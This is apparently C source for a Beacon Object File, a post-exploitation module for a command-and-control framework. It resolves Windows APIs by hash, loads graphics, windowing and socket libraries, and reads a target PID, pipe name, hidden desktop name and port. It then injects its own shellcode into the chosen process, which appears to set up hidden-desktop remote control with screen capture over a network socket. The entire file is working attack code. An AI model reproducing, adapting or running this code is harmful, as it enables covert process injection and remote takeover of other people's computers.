#include "common.h"

typedef struct
{
    D_API( free );
    D_API( LdrGetProcedureAddress );
    D_API( LdrLoadDll );
    D_API( malloc );
    D_API( RtlInitUnicodeString );
    D_API( RtlInitAnsiString );

} BOFAPI, *PBOFAPI;

#define FREE( x ) if( x ) { Api.free( x ); x = NULL; }

VOID WINAPI BofMain( PBAPI_TABLE BeaconApi, PVOID Argv, INT Argc ) 
{
    BOOL            Success = FALSE;

    BOFAPI          Api;
    UNICODE_STRING  Uni;
    ANSI_STRING     Str;

    DATAP           Parser;
    PCHAR           PipeName = NULL;
    INT             PipeLength = 0;
    PCHAR           DesktopName = NULL;
    INT             DesktopLength = 0;
    SHORT           Pid = 0;

    PAPI            pApi = NULL;
    PARGS           pArgs = NULL;

    HANDLE          hGdi32 = NULL;
    HANDLE          hGdiplus = NULL;
    HANDLE          hKernel32 = NULL;
    HANDLE          hMsvcrt = NULL;
    HANDLE          hNtdll = NULL;
    HANDLE          hOle32 = NULL;
    HANDLE          hUser32 = NULL;
    HANDLE          hWs2_32 = NULL;

    RtlSecureZeroMemory( &Api, sizeof( BOFAPI ) );
    RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    RtlSecureZeroMemory( &Str, sizeof( ANSI_STRING ) );
    RtlSecureZeroMemory( &Parser, sizeof( Parser ) );

    hNtdll = FindModule( H_LIB_NTDLL, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hNtdll == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to find ntdll" ) ) );
        goto cleanup;
    };

    Api.LdrLoadDll = FindFunction( hNtdll, H_API_LDRLOADDLL );
    Api.LdrGetProcedureAddress = FindFunction( hNtdll, H_API_LDRGETPROCEDUREADDRESS );
    Api.RtlInitUnicodeString = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
    Api.RtlInitAnsiString = FindFunction( hNtdll, H_API_RTLINITANSISTRING );
    if( !Api.LdrLoadDll || !Api.LdrGetProcedureAddress || !Api.RtlInitUnicodeString || !Api.RtlInitAnsiString )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to find init functions" ) ) );
        goto cleanup;
    };

    hGdi32 = FindModule( H_LIB_GDI32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hGdi32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"gdi32.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hGdi32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hGdiplus = FindModule( H_LIB_GDIPLUS, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hGdiplus == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"gdiplus.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hGdiplus );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hKernel32 = FindModule( H_LIB_KERNEL32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hKernel32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"kernel32.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hKernel32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hMsvcrt = FindModule( H_LIB_MSVCRT, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hMsvcrt == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"msvcrt.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hMsvcrt );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hOle32 = FindModule( H_LIB_OLE32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hOle32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"ole32.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hOle32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hUser32 = FindModule( H_LIB_USER32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hUser32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"user32.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hUser32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hWs2_32 = FindModule( H_LIB_WS2_32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hWs2_32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"ws2_32.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hWs2_32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };
    
    if( !hGdi32 || 
        !hGdiplus ||
        !hKernel32 ||
        !hMsvcrt ||
        !hOle32 ||
        !hUser32 ||
        !hWs2_32 )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to find required modules" ) ) );
        goto cleanup;
    };

    Api.free = FindFunction( hMsvcrt, H_API_FREE );
    Api.malloc = FindFunction( hMsvcrt, H_API_MALLOC );
    if( !Api.free || !Api.malloc )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to find memory functions" ) ) );
        goto cleanup;
    };

    pArgs = Api.malloc( sizeof( ARGS ) );
    pApi = Api.malloc( sizeof( API ) );
    if( !pArgs || !pApi )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to allocate memory" ) ) );
        goto cleanup;
    };
    RtlSecureZeroMemory( pArgs, sizeof( ARGS ) );
    RtlSecureZeroMemory( pApi, sizeof( API ) );

    pApi->gdi32.BitBlt = FindFunction( hGdi32, H_API_BITBLT );
    pApi->gdi32.CreateCompatibleBitmap = FindFunction( hGdi32, H_API_CREATECOMPATIBLEBITMAP );
    pApi->gdi32.CreateCompatibleDC = FindFunction( hGdi32, H_API_CREATECOMPATIBLEDC );
    pApi->gdi32.DeleteDC = FindFunction( hGdi32, H_API_DELETEDC );
    pApi->gdi32.DeleteObject = FindFunction( hGdi32, H_API_DELETEOBJECT );
    pApi->gdi32.GetDIBits = FindFunction( hGdi32, H_API_GETDIBITS );
    pApi->gdi32.SelectObject = FindFunction( hGdi32, H_API_SELECTOBJECT );
    pApi->gdi32.SetStretchBltMode = FindFunction( hGdi32, H_API_SETSTRETCHBLTMODE );
    pApi->gdi32.StretchBlt = FindFunction( hGdi32, H_API_STRETCHBLT );
    pApi->gdiplus.GdipCreateBitmapFromHBITMAP = FindFunction( hGdiplus, H_API_GDIPCREATEBITMAPFROMHBITMAP );
    pApi->gdiplus.GdipCreateBitmapFromStream = FindFunction( hGdiplus, H_API_GDIPCREATEBITMAPFROMSTREAM );
    pApi->gdiplus.GdipCreateHBITMAPFromBitmap = FindFunction( hGdiplus, H_API_GDIPCREATEHBITMAPFROMBITMAP );
    pApi->gdiplus.GdipDisposeImage = FindFunction( hGdiplus, H_API_GDIPDISPOSEIMAGE );
    pApi->gdiplus.GdiplusShutdown = FindFunction( hGdiplus, H_API_GDIPLUSSHUTDOWN );
    pApi->gdiplus.GdiplusStartup = FindFunction( hGdiplus, H_API_GDIPLUSSTARTUP );
    pApi->gdiplus.GdipSaveImageToStream = FindFunction( hGdiplus, H_API_GDIPSAVEIMAGETOSTREAM );
    pApi->kernel32.CloseHandle = FindFunction( hKernel32, H_API_CLOSEHANDLE );
    pApi->kernel32.ConnectNamedPipe = FindFunction( hKernel32, H_API_CONNECTNAMEDPIPE );
    pApi->kernel32.CreateEventA = FindFunction( hKernel32, H_API_CREATEEVENTA );
    pApi->kernel32.CreateNamedPipeA = FindFunction( hKernel32, H_API_CREATENAMEDPIPEA );
    pApi->kernel32.CreateThread = FindFunction( hKernel32, H_API_CREATETHREAD );
    pApi->kernel32.GetVersionExA = FindFunction( hKernel32, H_API_GETVERSIONEXA );
    pApi->kernel32.TerminateThread = FindFunction( hKernel32, H_API_TERMINATETHREAD );
    pApi->kernel32.VirtualAlloc = FindFunction( hKernel32, H_API_VIRTUALALLOC );
    pApi->kernel32.VirtualFree = FindFunction( hKernel32, H_API_VIRTUALFREE );
    pApi->kernel32.WaitForSingleObject = FindFunction( hKernel32, H_API_WAITFORSINGLEOBJECT );
    pApi->kernel32.WriteFile = FindFunction( hKernel32, H_API_WRITEFILE );
    pApi->msvcrt.free = FindFunction( hMsvcrt, H_API_FREE );
    pApi->msvcrt.malloc = FindFunction( hMsvcrt, H_API_MALLOC );
    pApi->msvcrt.vsnprintf = FindFunction( hMsvcrt, H_API_VSNPRINTF );
    pApi->ntdll.RtlCompressBuffer = FindFunction( hNtdll, H_API_RTLCOMPRESSBUFFER );
    pApi->ntdll.RtlGetCompressionWorkSpaceSize = FindFunction( hNtdll, H_API_RTLGETCOMPRESSIONWORKSPACESIZE );
    pApi->user32.ChildWindowFromPoint = FindFunction( hUser32, H_API_CHILDWINDOWFROMPOINT );
    pApi->user32.CloseDesktop = FindFunction( hUser32, H_API_CLOSEDESKTOP );
    pApi->user32.CreateDesktopA = FindFunction( hUser32, H_API_CREATEDESKTOPA );
    pApi->user32.FindWindowA = FindFunction( hUser32, H_API_FINDWINDOWA );
    pApi->user32.GetDesktopWindow = FindFunction( hUser32, H_API_GETDESKTOPWINDOW );
    pApi->user32.GetDC = FindFunction( hUser32, H_API_GETDC );
    pApi->user32.GetMenuItemID = FindFunction( hUser32, H_API_GETMENUITEMID );
    pApi->user32.GetTopWindow = FindFunction( hUser32, H_API_GETTOPWINDOW );
    pApi->user32.GetWindow = FindFunction( hUser32, H_API_GETWINDOW );
    pApi->user32.GetWindowLongA = FindFunction( hUser32, H_API_GETWINDOWLONGA );
    pApi->user32.GetWindowPlacement = FindFunction( hUser32, H_API_GETWINDOWPLACEMENT );
    pApi->user32.GetWindowRect = FindFunction( hUser32, H_API_GETWINDOWRECT );
    pApi->user32.IsWindowVisible = FindFunction( hUser32, H_API_ISWINDOWVISIBLE );
    pApi->user32.MenuItemFromPoint = FindFunction( hUser32, H_API_MENUITEMFROMPOINT );
    pApi->user32.MoveWindow = FindFunction( hUser32, H_API_MOVEWINDOW );
    pApi->user32.OpenDesktopA = FindFunction( hUser32, H_API_OPENDESKTOPA );
    pApi->user32.PostMessageA = FindFunction( hUser32, H_API_POSTMESSAGEA );
    pApi->user32.PrintWindow = FindFunction( hUser32, H_API_PRINTWINDOW );
    pApi->user32.PtInRect = FindFunction( hUser32, H_API_PTINRECT );
    pApi->user32.RealGetWindowClassA = FindFunction( hUser32, H_API_REALGETWINDOWCLASSA );
    pApi->user32.ReleaseDC = FindFunction( hUser32, H_API_RELEASEDC );
    pApi->user32.SendMessageA = FindFunction( hUser32, H_API_SENDMESSAGEA );
    pApi->user32.SetThreadDesktop = FindFunction( hUser32, H_API_SETTHREADDESKTOP );
    pApi->user32.SetWindowLongA = FindFunction( hUser32, H_API_SETWINDOWLONGA );
    pApi->user32.ScreenToClient = FindFunction( hUser32, H_API_SCREENTOCLIENT );
    pApi->user32.WindowFromPoint = FindFunction( hUser32, H_API_WINDOWFROMPOINT );
    pApi->ws2_32.closesocket = FindFunction( hWs2_32, H_API_CLOSESOCKET );
    pApi->ws2_32.connect = FindFunction( hWs2_32, H_API_CONNECT );
    pApi->ws2_32.gethostbyname = FindFunction( hWs2_32, H_API_GETHOSTBYNAME );
    pApi->ws2_32.htons = FindFunction( hWs2_32, H_API_HTONS );
    pApi->ws2_32.recv = FindFunction( hWs2_32, H_API_RECV );
    pApi->ws2_32.send = FindFunction( hWs2_32, H_API_SEND );
    pApi->ws2_32.socket = FindFunction( hWs2_32, H_API_SOCKET );
    pApi->ws2_32.WSAStartup = FindFunction( hWs2_32, H_API_WSASTARTUP );

    Api.RtlInitAnsiString( &Str, C_PTR( OFFSET( "CreateStreamOnHGlobal" ) ) );
    Api.LdrGetProcedureAddress( hOle32, &Str, 0, C_PTR( &pApi->ole32.CreateStreamOnHGlobal ) );
    RtlSecureZeroMemory( &Str, sizeof( ANSI_STRING ) );

    if( !pApi->gdi32.BitBlt ||
        !pApi->gdi32.CreateCompatibleBitmap ||
        !pApi->gdi32.CreateCompatibleDC ||
        !pApi->gdi32.DeleteDC ||
        !pApi->gdi32.DeleteObject ||
        !pApi->gdi32.GetDIBits ||
        !pApi->gdi32.SelectObject ||
        !pApi->gdi32.SetStretchBltMode ||
        !pApi->gdi32.StretchBlt ||
        !pApi->gdiplus.GdipCreateBitmapFromHBITMAP ||
        !pApi->gdiplus.GdipCreateBitmapFromStream ||
        !pApi->gdiplus.GdipCreateHBITMAPFromBitmap ||
        !pApi->gdiplus.GdipDisposeImage ||
        !pApi->gdiplus.GdiplusShutdown ||
        !pApi->gdiplus.GdiplusStartup ||
        !pApi->gdiplus.GdipSaveImageToStream ||
        !pApi->kernel32.CloseHandle ||
        !pApi->kernel32.ConnectNamedPipe ||
        !pApi->kernel32.CreateNamedPipeA ||
        !pApi->kernel32.CreateThread ||
        !pApi->kernel32.GetVersionExA ||
        !pApi->kernel32.TerminateThread ||
        !pApi->kernel32.VirtualAlloc ||
        !pApi->kernel32.VirtualFree ||
        !pApi->kernel32.WaitForSingleObject ||
        !pApi->kernel32.WriteFile ||
        !pApi->msvcrt.free ||
        !pApi->msvcrt.malloc ||
        !pApi->msvcrt.vsnprintf ||
        !pApi->ntdll.RtlCompressBuffer ||
        !pApi->ntdll.RtlGetCompressionWorkSpaceSize ||
        !pApi->ole32.CreateStreamOnHGlobal ||
        !pApi->user32.ChildWindowFromPoint ||
        !pApi->user32.CloseDesktop ||
        !pApi->user32.CreateDesktopA ||
        !pApi->user32.FindWindowA ||
        !pApi->user32.GetDesktopWindow ||
        !pApi->user32.GetDC ||
        !pApi->user32.GetMenuItemID ||
        !pApi->user32.GetTopWindow ||
        !pApi->user32.GetWindow ||
        !pApi->user32.GetWindowLongA ||
        !pApi->user32.GetWindowPlacement ||
        !pApi->user32.GetWindowRect ||
        !pApi->user32.IsWindowVisible ||
        !pApi->user32.MenuItemFromPoint ||
        !pApi->user32.MoveWindow ||
        !pApi->user32.OpenDesktopA ||
        !pApi->user32.PostMessageA ||
        !pApi->user32.PrintWindow ||
        !pApi->user32.PtInRect ||
        !pApi->user32.RealGetWindowClassA ||
        !pApi->user32.ReleaseDC ||
        !pApi->user32.SendMessageA ||
        !pApi->user32.SetThreadDesktop ||
        !pApi->user32.SetWindowLongA ||
        !pApi->user32.ScreenToClient ||
        !pApi->user32.WindowFromPoint ||
        !pApi->ws2_32.closesocket ||
        !pApi->ws2_32.connect ||
        !pApi->ws2_32.gethostbyname ||
        !pApi->ws2_32.htons ||
        !pApi->ws2_32.recv ||
        !pApi->ws2_32.send ||
        !pApi->ws2_32.socket ||
        !pApi->ws2_32.WSAStartup )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to find all required functions" ) ) );
        goto cleanup;
    };

    BeaconApi->BeaconDataParse( &Parser, Argv, Argc );
    Pid = BeaconApi->BeaconDataShort( &Parser );
    if( Pid == 0 )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to get PID" ) ) );
        goto cleanup;
    };

    PipeName = BeaconApi->BeaconDataExtract( &Parser, &PipeLength );
    if( PipeName == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET ( "Failed to get pipe name" ) ) );
        goto cleanup;
    };

    DesktopName = BeaconApi->BeaconDataExtract( &Parser, &DesktopLength );
    if( DesktopName == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to get desktop name" ) ) );
        goto cleanup;
    };

    pArgs->port = BeaconApi->BeaconDataShort( &Parser );
    if( pArgs->port == 0 )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to get port" ) ) );
        goto cleanup;
    };

    pArgs->pPipeName = Api.malloc( PipeLength );
    pArgs->pDesktopName = Api.malloc( DesktopLength );
    if( !pArgs->pPipeName || !pArgs->pDesktopName )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( OFFSET( "Failed to allocate memory" ) ) );
        goto cleanup;
    };

    memcpy( pArgs->pPipeName, PipeName, PipeLength );
    memcpy( pArgs->pDesktopName, DesktopName, DesktopLength );
    pArgs->pApi = pApi;

    Success = TRUE;
    BeaconApi->BeaconInjectProcess(
        NtCurrentProcess(),                                                 // Process Handle
        Pid,                                                                // Process ID          
        C_PTR( SHELLCODE( InputHandler ) ),                                 // Payload Address
        U_PTR( U_PTR( G_END( ) ) - U_PTR( SHELLCODE( InputHandler ) ) ),    // Payload Length
        0,                                                                  // Payload BOFSET
        &pArgs,                                                             // Arguments Address
        sizeof( PARGS ));                                                   // Arguments Length

cleanup:
    if( !Success )
    {
        FREE( pApi );
        FREE( pArgs->pPipeName );
        FREE( pArgs->pDesktopName );
        FREE( pArgs );
    };
};
